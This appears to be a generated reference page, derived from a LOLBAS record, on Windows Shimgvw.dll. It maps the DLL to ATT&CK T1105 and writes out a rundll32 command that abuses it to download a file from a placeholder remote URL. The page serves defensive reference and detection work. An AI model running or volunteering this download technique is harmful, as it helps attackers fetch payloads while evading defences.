---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Shimgvw.dll

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `shimgvw.dll` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Shimgvw.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Photo Gallery Viewer

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/shimgvw.dll.md)
- Source verification: [source record](../../sources/lolbas/shimgvw.dll.md)

## Aliases

- `Shimgvw.dll`
- `shimgvw.dll`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/shimgvw.dll.md)

## Source Verification

[source record](../../sources/lolbas/shimgvw.dll.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@eral4m'
Person: Eral4m
Author: Eral4m
Commands:
- Category: Download
Command: rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}
Description: Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used
```
